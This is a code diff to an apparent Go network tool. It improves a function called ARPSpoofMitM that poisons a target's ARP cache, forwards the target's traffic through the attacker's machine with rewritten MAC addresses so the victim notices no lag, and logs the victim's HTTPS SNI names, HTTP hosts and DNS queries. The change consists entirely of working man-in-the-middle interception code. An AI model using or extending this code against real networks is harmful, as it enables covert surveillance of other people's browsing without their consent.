@@ -10,6 +10,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+	"bytes"
 
 	"github.com/gabrifranca/cli_ping/internal/report"
 
@@ -620,16 +621,48 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 					continue
 				}
 
+				var srcMAC string
+				var ethLayer gopacket.Layer
+				if ethLayer = packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
+					eth, _ := ethLayer.(*layers.Ethernet)
+					srcMAC = eth.SrcMAC.String()
+
+					// ======== FAST SOFTWARE FORWARDING ========
+					// O reencaminhamento de pacotes é feito ANTES de qualquer lock ou print, 
+					// garantindo que o alvo tenha zero lag.
+					var shouldForward bool
+					var newDst net.HardwareAddr
+
+					// Pacote do Alvo indo para a Internet (Gateway)
+					if srcIP == targetIP && dstIP != deviceIP && bytes.Equal(eth.DstMAC, myMAC) {
+						newDst = gatewayMAC
+						shouldForward = true
+					} else if srcIP != deviceIP && dstIP == targetIP && bytes.Equal(eth.DstMAC, myMAC) {
+						// Pacote da Internet (Gateway) voltando para o Alvo
+						newDst = targetMAC
+						shouldForward = true
+					}
+
+					if shouldForward {
+						eth.SrcMAC = myMAC
+						eth.DstMAC = newDst
+
+						buf := gopacket.NewSerializeBuffer()
+						opts := gopacket.SerializeOptions{
+							ComputeChecksums: false, // Opcional para velocidade
+							FixLengths:       false,
+						}
+						_ = gopacket.SerializeLayers(buf, opts, eth, gopacket.Payload(eth.Payload))
+						_ = captureHandle.WritePacketData(buf.Bytes())
+					}
+				}
+
+				// Buffer de logs para evitar I/O bloqueante (print) dentro da Lock
+				var pendingLogs []string
+
 				logsMu.Lock()
 				logs.TotalPackets++
 				logs.TotalBytes += len(data)
-
-				// Captura MAC
-				var srcMAC string
-				if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
-					eth, _ := ethLayer.(*layers.Ethernet)
-					srcMAC = eth.SrcMAC.String()
-				}
 
 				// Captura TTL (o dado mais precioso do MitM!)
 				if ipv4Layer := packet.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
@@ -665,7 +698,7 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 								}
 								logs.HostAccesses[srcIP][sni]++
 								if showLogs != nil && showLogs.Load() {
-									fmt.Printf("  [MitM] %s → HTTPS: %s\n", srcIP, sni)
+									pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → HTTPS: %s\n", srcIP, sni))
 								}
 							}
 						}
@@ -679,7 +712,7 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 								}
 								logs.HostAccesses[srcIP][host]++
 								if showLogs != nil && showLogs.Load() {
-									fmt.Printf("  [MitM] %s → HTTP: %s\n", srcIP, host)
+									pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → HTTP: %s\n", srcIP, host))
 								}
 							}
 						}
@@ -703,12 +736,17 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 						}
 
 						if showLogs != nil && showLogs.Load() {
-							fmt.Printf("  [MitM] %s → DNS: %s\n", srcIP, dnsQuery)
+							pendingLogs = append(pendingLogs, fmt.Sprintf("  [MitM] %s → DNS: %s\n", srcIP, dnsQuery))
 						}
 					}
 				}
 
 				logsMu.Unlock()
+
+				// Exibe os logs no console FORA do lock e após o encaminhamento rápido
+				for _, msg := range pendingLogs {
+					fmt.Print(msg)
+				}
 			}
 		}
 	}()
